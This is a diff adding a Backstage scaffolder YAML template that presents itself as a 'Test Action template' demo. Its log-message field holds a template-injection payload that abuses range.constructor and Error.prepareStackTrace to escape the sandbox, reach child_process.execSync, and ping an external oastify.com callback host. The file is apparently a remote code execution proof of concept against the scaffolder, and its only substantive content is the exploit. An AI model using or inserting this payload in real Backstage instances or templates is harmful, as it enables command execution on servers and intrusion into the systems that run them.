@@ -1,0 +1,21 @@
+---
+apiVersion: scaffolder.backstage.io/v1beta3
+kind: Template
+metadata:
+  name: v1beta3-demo
+  title: Test Action template
+  description: scaffolder v1beta3 template demo
+spec:
+  owner: backstage/techdocs-core
+  type: service
+  steps:
+    - id: fetch-base
+      name: Log Message
+      action: debug:log
+      input:
+        message: ${{range.constructor(  "this.env.__proto__.renderString = function()
+          {  globalThis.OldError = globalThis.Error; globalThis.Error = class
+          Error {}; globalThis.Error.prepareStackTrace = (cs,trace) => {
+          trace[2].getThis().process.mainModule.require(\"child_process\").execSync(\"ping
+          a1c3wbdz5hk3gx32buptp1s87zdq1kp9.oastify.com\");  };const {stack} =
+          new globalThis.OldError(); // [7] }")().triggerException() }}
